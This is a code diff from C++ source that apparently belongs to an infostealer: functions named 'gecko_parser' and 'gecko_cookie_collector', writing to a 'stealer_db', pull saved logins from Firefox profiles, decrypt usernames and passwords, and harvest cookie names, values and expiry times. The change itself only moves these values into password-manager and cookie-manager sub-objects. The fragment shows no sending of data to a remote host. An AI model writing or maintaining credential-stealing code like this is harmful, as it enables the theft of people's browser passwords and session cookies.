@@ -58,14 +58,14 @@ BOOL gecko_parser(std::string username, std::string stealer_db)
 							std::string password = login["encryptedPassword"];
 
 							//data_array[data_index].setUrl(hostname);
-							data.setUrl(hostname);
+							data.get_password_manager().setUrl(hostname);
 
 							obj.decrypt_data(username, username);
 							obj.decrypt_data(password, password);
 
-							data.setUsername(username);
-							data.setPassword(password);
-							data.setHost(dir);
+							data.get_password_manager().setUsername(username);
+							data.get_password_manager().setPassword(password);
+							data.get_password_manager().setHost(dir);
 
 							data_list.push_back(data);
 						}
@@ -120,11 +120,11 @@ BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
 
 							if (host != nullptr && name != nullptr && path != nullptr && value != nullptr && expiry != nullptr) {
 
-								data.setUrl(host);
-								data.setHost(dir);
-								data.setCookieName(name);
-								data.setCookies(value);
-								data.setCookieExpiry(expiry);
+								data.get_cookies_manager().setUrl(host);
+								data.get_cookies_manager().setHost(dir);
+								data.get_cookies_manager().setCookieName(name);
+								data.get_cookies_manager().setCookies(value);
+								data.get_cookies_manager().setCookiesExpiry(expiry);
 
 								data_list.push_back(data);
 							}
